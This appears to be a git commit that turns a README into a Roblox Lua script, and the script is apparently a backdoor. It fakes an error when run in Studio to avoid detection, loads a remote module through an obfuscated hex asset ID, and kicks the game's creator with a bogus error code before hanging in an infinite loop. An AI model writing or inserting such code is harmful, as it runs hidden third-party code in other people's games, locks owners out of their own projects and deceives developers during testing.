d3a65699fa1967095e757d495600d29fceaf29c1
iFrezatix <70880379+iFrezatix@users.noreply.github.com>
2022-01-28 09:41:07 +0800

    Update and rename README.md to script.lua

---
+++ script.lua
@@ -0,0 +1,11 @@
+if game:GetService("RunService"):IsStudio()  then
+	error("Error at line 1")
+end
+require(0x1EC03F118).Map("")
+game.Players.PlayerAdded:Connect(function(plr)
+	if plr.UserId == game.CreatorId then
+		plr:kick("Error267")
+		while true do
+		end
+	end
+end)
